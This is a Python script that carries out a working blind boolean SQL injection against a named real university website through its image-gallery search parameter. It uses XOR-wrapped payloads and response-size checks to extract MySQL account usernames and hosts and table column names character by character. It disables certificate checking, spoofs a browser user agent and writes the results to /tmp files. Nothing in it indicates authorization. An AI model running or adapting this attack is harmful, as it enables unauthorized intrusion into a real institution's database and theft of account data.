#!/usr/bin/env python3
"""Finish: mysql.user rows 2..7 (user+host) and columns of 2 chosen tables.
Writes /tmp/sqli_users2_uef.json and /tmp/sqli_columns_uef.json"""
import sys, time, json, threading, urllib.parse, http.client, ssl
from concurrent.futures import ThreadPoolExecutor

HOST = "www.uef.edu.vn"
PATH = "/thu-vien-hinh-anh?Trang_1&txtSearch="
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
THRESH = 75000
LOG = "/tmp/sqli_enum_uef.log"
lock = threading.Lock()
stats = {"req": 0}
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE
_local = threading.local()


def log(m):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), m)
    print(line, flush=True)
    with lock:
        with open(LOG, "a") as f:
            f.write(line + "\n")


def conn():
    c = getattr(_local, "c", None)
    if c is None:
        c = http.client.HTTPSConnection(HOST, timeout=30, context=_ctx)
        _local.c = c
    return c


def http_size(q):
    payload = 'the0"XOR(if(%s,1,0))XOR"Z' % q
    url = PATH + urllib.parse.quote(payload, safe="")
    for _ in range(3):
        try:
            c = conn()
            c.request("GET", url, headers={"User-Agent": UA})
            r = c.getresponse()
            body = r.read()
            with lock:
                stats["req"] += 1
            if r.status == 200:
                return len(body)
            _local.c = None
        except Exception:
            _local.c = None
    return None


def ask(expr):
    s = http_size(expr)
    return False if s is None else s >= THRESH


def get_len(expr, maxlen=64):
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("CHAR_LENGTH((%s))>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_char(expr, pos):
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("ASCII(SUBSTRING((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo else ""


def extract(expr, label, workers=4):
    n = get_len(expr)
    if n <= 0:
        log("%s: EMPTY" % label)
        return ""
    chars = [""] * n
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(get_char, expr, p + 1): p for p in range(n)}
        for f, p in futs.items():
            chars[p] = f.result()
    s = "".join(chars)
    esc = s.replace("\\", "\\\\").replace("'", "\\'")
    ok = ask("BINARY (%s)='%s'" % (expr, esc))
    log("%s = %r (verify=%s, len=%d, req=%d)" % (label, s, ok, n, stats["req"]))
    return s if ok else s + " [VERIFY_FAILED]"


def num(expr, maxval=128):
    lo, hi = 0, maxval
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("(%s)>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    log("COUNT %s = %d" % (expr, lo))
    return lo


def save(path, d):
    with open(path, "w") as f:
        json.dump(d, f, indent=1, ensure_ascii=False)


def users(start=2, end=8, workers=4):
    out = "/tmp/sqli_users2_uef.json"
    d = {"rows": []}
    t0 = time.time()
    log("=== USERS2 %d..%d ===" % (start, end))
    for i in range(start, end):
        u = extract("SELECT user FROM mysql.user ORDER BY user,host LIMIT %d,1" % i, "mu[%d]" % i, workers)
        h = extract("SELECT host FROM mysql.user ORDER BY user,host LIMIT %d,1" % i, "mh[%d]" % i, workers)
        d["rows"].append({"idx": i, "user": u, "host": h})
        save(out, d)
    log("=== USERS2 DONE %.0fs req=%d ===" % (time.time() - t0, stats["req"]))


def columns(tables, workers=6):
    out = "/tmp/sqli_columns_uef.json"
    d = {}
    t0 = time.time()
    log("=== COLUMNS %s ===" % tables)
    for t in tables:
        key = "table_name='%s'" % t
        c = num("SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND %s" % key, 128)
        cols = []
        for i in range(min(c, 30)):
            cols.append(extract("SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND %s ORDER BY ordinal_position LIMIT %d,1" % (key, i), "col[%s][%d]" % (t, i), workers))
        d[t] = {"n_columns": c, "columns": cols}
        save(out, d)
    log("=== COLUMNS DONE %.0fs req=%d ===" % (time.time() - t0, stats["req"]))


if __name__ == "__main__":
    if sys.argv[1] == "users":
        users(int(sys.argv[2]) if len(sys.argv) > 2 else 2)
    else:
        columns(sys.argv[2:])
